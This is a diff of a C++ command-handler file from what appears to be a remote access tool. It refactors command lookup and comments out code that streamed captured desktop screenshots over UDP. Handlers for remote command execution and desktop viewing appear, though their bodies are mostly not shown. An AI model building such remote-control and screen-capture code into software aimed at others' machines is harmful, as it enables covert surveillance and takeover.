@@ -1,22 +1,23 @@
 #include "..\pch.h"
 
 #include "Commands.hpp"
-#include "..\Network\UDPConnection.hpp"
+//#include "..\Network\UDPConnection.hpp"
 #include "ScreenCapturer.hpp"
 #include "..\Debugger.h"
 
 std::string ExecuteCommand(INT code, std::string &args)
 {
+	static std::string result(RESULT_LENGTH, { });
+
 	$I(TEXT("cmd:'%d', args:'%s'\n"), code, args.c_str());
 
-	static std::string result(RESULT_LENGTH, { }); 
-	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
-		if (MAP_COMMANDS[i].pair.code == code)
-		{
-			MAP_COMMANDS[i].task(&args, result);
+	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return static_cast<INT>(pair.first.second) == code; });
+	if (it != std::end(MAP_COMMANDS))
+	{
+		it->second(&args, result);
 
-			return result;
-		}
+		return result;
+	}
 
 	return UNDEFINEDA;
 }
@@ -32,19 +33,23 @@ VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result)
 VOID SendDesktopScreen()
 {
 	static DirectXParametrs dxp;
-	static UDPClient udpclient;
+	//static UDPClient udpclient;
 	static BOOL init = FALSE;
 
-	if (!init)
-		init = udpclient.init();
+	//if (!init && udpclient.init() && dxp.init())
+	//	init = TRUE;
+	
 	while (TRUE)
 	{
-		LPBYTE shot = CaptureScreen(&dxp);
+		auto pair = CaptureScreen(&dxp);
 
-		udpclient.send(std::string(reinterpret_cast<char*>(shot)));
+		std::cout << pair.second;
 
-		if(shot)
-			delete[] shot;
+		//udpclient.send(std::to_string(pair.second));
+		//udpclient.send(std::string(reinterpret_cast<char*>(pair.first)));
+
+		if(pair.first)
+			delete[] pair.first;
 	}
 }
 
@@ -72,11 +77,6 @@ VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result)
 			result = TASK_FAILUREA;
 		else
 			result = TASK_SUCCESSA;
-
-		if (closesocket(socket) != 0)
-			PrintError(TEXTH("closesocket"), WSAGetLastError());
-
-		socket = INVALID_SOCKET;
 	}
 }
 
@@ -112,20 +112,16 @@ VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result)
 		result = TASK_SUCCESSA;
 }
 
-INT cmd2code(CONST PTCHAR cmd)
+Command cmd2code(CONST std::string &cmd)
 {
-	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
-		if (_tcscmp(MAP_COMMANDS[i].pair.name, cmd) == 0)
-			return MAP_COMMANDS[i].pair.code;
-	
-	return UNDEFINEDCMD;
+	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return pair.first.first == cmd; });
+
+	return (it == std::end(MAP_COMMANDS) ? Command::UNDEFINEDCMD : it->first.second);
 }
 
-CONST PTCHAR code2cmd(INT code)
+std::string code2cmd(Command cmd)
 { 
-	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
-		if (MAP_COMMANDS[i].pair.code == code)
-			return MAP_COMMANDS[i].pair.name;
+	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return pair.first.second == cmd; });
 
-	return UNDEFINEDP;
+	return (it == std::end(MAP_COMMANDS) ? UNDEFINEDA : it->first.first);
 }
